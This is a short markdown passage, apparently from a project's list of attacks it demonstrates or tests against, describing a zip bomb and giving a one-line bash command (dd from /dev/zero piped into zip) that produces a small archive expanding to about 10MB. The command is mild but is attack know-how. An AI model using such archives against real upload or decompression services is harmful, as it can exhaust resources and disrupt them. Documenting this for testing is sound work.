## Attacks that can be performed
### Zip Bomb
This attack can be issued by using the following command in the bash console:
`dd if=/dev/zero bs=1024 count=10000 | zip zipbomb.zip -`
This creates a file called zipbomb.zip that is around 10KB and when decompressed creates a file that is almost 10MB (Value expressed in the count parameter)
